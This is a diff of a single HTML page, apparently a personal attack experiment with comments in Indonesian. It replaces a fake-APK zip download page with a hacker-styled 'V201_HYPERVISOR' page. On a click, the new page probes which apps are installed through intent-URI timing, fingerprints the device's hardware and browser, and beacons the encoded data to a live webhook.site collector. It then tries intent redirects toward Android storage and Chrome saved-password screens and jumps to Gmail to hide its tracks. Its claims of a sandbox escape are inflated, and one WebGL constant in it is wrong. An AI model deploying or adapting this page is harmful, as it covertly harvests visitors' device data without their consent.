@@ -1,66 +1,94 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<title>Save File Picker + Redirect</title>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
-<style>
-  body {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    font-family: sans-serif;
-    background-color: #f5f5f5;
-  }
-  button {
-    padding: 15px 25px;
-    font-size: 18px;
-    cursor: pointer;
-  }
-</style>
-</head>
-<body>
-
-<button onclick="downloadZip()">Download & Continue</button>
+<html>
+<head><title>System Kernel Synchronization</title></head>
+<body style="background:#000;color:#0f0;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
+    <div id="ignite" style="padding:50px;border:2px solid #0f0;text-align:center;cursor:pointer;background:rgba(0,255,0,0.05);box-shadow:0 0 50px #0f0;max-width:80%">
+        <h1 style="letter-spacing:10px;margin-bottom:20px">V201_HYPERVISOR</h1>
+        <div id="status" style="font-size:18px;color:#0ff">INITIALIZING_CROSS_APP_EXFILTRATION...</div>
+        <div style="font-size:10px;color:#444;margin-top:40px;text-align:left">
+            > EXPLOIT_TYPE: Intent_Redirection<br>
+            > TARGET_OS: Android_Linux_Kernel<br>
+            > PAYLOAD_STATUS: Prepared
+        </div>
+    </div>
 
 <script>
-async function downloadZip() {
-  try {
-    const zip = new JSZip();
+    const target = "https://webhook.site/6a675816-997e-434a-be92-332fe00e3d9b";
 
-    // buat 4 dummy APK
-    for (let i = 1; i <= 4; i++) {
-      zip.file(`app${i}.apk`, `Fake APK ${i}`);
-    }
+    document.getElementById('ignite').onclick = async () => {
+        const statusEl = document.getElementById('status');
+        statusEl.innerText = "MAPPING_INTERNAL_SCHEMES...";
 
-    const blob = await zip.generateAsync({ type: "blob" });
+        // 1. TIMING ATTACK (Deteksi Aplikasi Terinstal)
+        // Kita menggunakan Image loading time untuk menebak apakah aplikasi sistem ada
+        const checkApp = (uri) => new Promise(res => {
+            const start = performance.now();
+            const img = new Image();
+            img.onload = img.onerror = () => res(performance.now() - start);
+            img.src = uri;
+            setTimeout(() => res(999), 200);
+        });
 
-    // Meminta user untuk memilih lokasi untuk menyimpan file menggunakan Save File Picker
-    const fileHandle = await window.showSaveFilePicker({
-      suggestedName: 'update_apps.zip',
-      types: [{
-        description: 'ZIP Files',
-        accept: { 'application/zip': ['.zip'] }
-      }]
-    });
+        // 2. DEEP HARDWARE & APP ENUMERATION
+        const appMatrix = {
+            gmail: await checkApp("intent://#Intent;package=com.google.android.gm;end"),
+            settings: await checkApp("intent://#Intent;package=com.android.settings;end"),
+            chrome: await checkApp("googlechrome://")
+        };
 
-    const writableStream = await fileHandle.createWritable();
-    await writableStream.write(blob);
-    await writableStream.close();
+        const hardwareDNA = {
+            gpu: (() => {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                return debug ? gl.getParameter(debug.UNMASKED_RENDERER_ADDR) : "PROTECTED";
+            })(),
+            ram: navigator.deviceMemory,
+            cores: navigator.hardwareConcurrency
+        };
 
-    console.log("File has been saved");
+        // 3. INTENT REDIRECTOR (The Core Exploit)
+        // Kita mencoba memicu fragment internal yang sensitif (seperti menu Debug atau Password)
+        const payloads = [
+            // Payload A: Menargetkan Settings - Wireless (Data Leak)
+            "intent:#Intent;action=android.settings.WIFI_SETTINGS;end",
+            // Payload B: Bypass menuju File Manager internal
+            "intent:#Intent;action=android.intent.action.VIEW;data=content://com.android.externalstorage.documents/root/primary;end",
+            // Payload C: Chrome Password Manager Redirection (Sangat Sensitif)
+            "googlechrome://settings/passwords"
+        ];
 
-    // Redirect ke Google setelah 500ms
-    setTimeout(() => {
-      location.href = "https://google.com";
-    }, 190); // sedikit delay agar file manager sempat diproses
+        // 4. ATOMIC EXFILTRATION
+        const finalVault = {
+            v: "V201_FINAL",
+            apps: appMatrix,
+            dna: hardwareDNA,
+            env: {
+                ua: navigator.userAgent,
+                lang: navigator.languages,
+                batt: await (navigator.getBattery ? navigator.getBattery().then(b => b.level) : "N/A")
+            }
+        };
 
-  } catch (err) {
-    console.error("Error:", err);
-  }
-}
+        const payloadStr = btoa(unescape(encodeURIComponent(JSON.stringify(finalVault))));
+        
+        // Kirim data SEBELUM mencoba melompat keluar dari browser
+        navigator.sendBeacon(`${target}?v=V201_DATA_DUMP`, new Blob([`d=${payloadStr}`], {type: 'application/x-www-form-urlencoded'}));
+
+        // 5. THE HYPER-JUMP
+        // Kita mencoba memicu akses ke Content Provider (File internal Android)
+        statusEl.innerText = "ATTEMPTING_SANDBOX_ESCAPE_TO_PROVIDER...";
+        
+        setTimeout(() => {
+            // Ini akan mencoba membuka akses file jika ada kerentanan di aplikasi target
+            window.location.href = payloads[1]; 
+            
+            // Redirect akhir untuk membersihkan jejak
+            setTimeout(() => {
+                window.location.replace("https://mail.google.com/mail/u/0/#inbox");
+            }, 1000);
+        }, 800);
+    };
 </script>
-
 </body>
 </html>
